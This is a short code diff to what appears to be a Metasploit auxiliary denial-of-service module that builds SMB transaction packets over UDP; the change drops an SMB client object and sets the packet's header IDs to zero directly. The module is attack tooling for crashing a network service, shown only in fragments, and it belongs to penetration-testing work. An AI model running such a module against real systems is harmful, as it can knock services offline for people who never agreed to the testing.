@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Udp
-  # include Msf::Exploit::Remote::SMB::Client
   include Auxiliary::Dos
 
   def initialize(info = {})
@@ -59,7 +58,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     connect_udp
-    @client = Rex::Proto::SMB::Client.new(udp_sock)
 
     ip = Rex::Socket.source_address(datastore['RHOST'])
     ip_src = Rex::Socket.resolv_nbo(ip, false)
@@ -120,7 +118,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct
-    @client.smb_defaults(pkt['Payload']['SMB'])
+    pkt['Payload']['SMB'].v['MultiplexID'] = 0
+    pkt['Payload']['SMB'].v['TreeID']      = 0
+    pkt['Payload']['SMB'].v['UserID']      = 0
+    pkt['Payload']['SMB'].v['ProcessID']   = 0
 
     setup_count = 3
     setup_data = [1, 0, 2].pack('v*')
